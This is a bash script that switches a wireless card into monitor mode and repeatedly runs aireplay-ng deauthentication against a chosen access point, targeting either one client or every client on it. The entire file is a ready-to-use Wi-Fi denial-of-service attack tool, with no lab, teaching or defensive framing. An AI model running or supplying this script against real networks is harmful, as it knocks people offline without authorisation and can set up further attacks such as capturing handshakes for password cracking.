#!/bin/bash

mode=$(iwconfig "${INTERFACE}" | grep -o "Mode:Managed")

if [ "${mode}" = "Mode:Managed" ]; then
        sudo ifconfig ${INTERFACE} down
        sudo iwconfig ${INTERFACE} mode monitor
        sudo ifconfig ${INTERFACE} up
fi

read -p "bssid?: " bssid
read -p "channel?: " channel

sudo iwconfig $INTERFACE channel $channel

while true; do
	echo -e "press ctrl+c to exit"
	read -p "client (leave empty to target all clients)?: " client
	read -p "count?: " count
	

	if [ -z "${client}" ]; then
		sudo aireplay-ng -0 $count -a "$bssid" "$INTERFACE"
	else
		sudo aireplay-ng -0 $count -a "$bssid" -c "$client" "$INTERFACE"
	fi
done
